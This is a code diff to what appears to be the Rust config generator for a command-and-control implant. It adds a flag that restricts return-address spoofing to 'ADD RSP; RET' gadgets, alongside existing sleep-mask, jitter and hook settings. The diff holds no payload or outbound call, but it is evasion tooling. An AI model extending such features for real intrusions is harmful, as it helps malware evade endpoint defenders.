@@ -130,6 +130,10 @@ pub struct ConfigModel {
     /// installation — a compatibility/diagnostic mode with a plain,
     /// hook-free bootstrap.
     pub hooks: bool,
+    /// Return-spoof diagnostic: resolve only `ADD RSP, imm8; RET` gadgets
+    /// (the `JMP [RBX]` scan is skipped), so the alternative harness runs
+    /// on every spoofed call. Off by default.
+    pub retspoof_force_addrsp: bool,
     pub profile: ProfileModel,
 }
 
@@ -347,6 +351,10 @@ pub fn parse_config(json: &str) -> Result<ConfigModel, String> {
             .and_then(|b| b.as_u64())
             .unwrap_or(u32::MAX as u64) as u32,
         hooks: v.get("hooks").and_then(|b| b.as_bool()).unwrap_or(true),
+        retspoof_force_addrsp: v
+            .get("retspoof_force_addrsp")
+            .and_then(|b| b.as_bool())
+            .unwrap_or(false),
         profile: profile_of(field(&v, "profile")?)?,
     })
 }
@@ -519,7 +527,8 @@ pub fn render(model: &ConfigModel) -> String {
          pub const DEBUG: bool = {dbg};\n\
          pub const SLEEP_MASK: bool = {mask};\n\
          pub const HOOKS: bool = {hooks};\n\
-         pub const BOOTSTRAP_STAGES: u32 = {stages};\n\n",
+         pub const BOOTSTRAP_STAGES: u32 = {stages};\n\
+         pub const RETSPOOF_FORCE_ADDRSP: bool = {ra};\n\n",
         sleep = model.sleep_ms,
         jitter = model.jitter_ms,
         wm = model.watermark,
@@ -528,6 +537,7 @@ pub fn render(model: &ConfigModel) -> String {
         mask = model.sleep_mask,
         stages = model.stages,
         hooks = model.hooks,
+        ra = model.retspoof_force_addrsp,
     ));
     out.push_str(&format!(
         "pub const ROTATION: Rotation = {rot};\n\
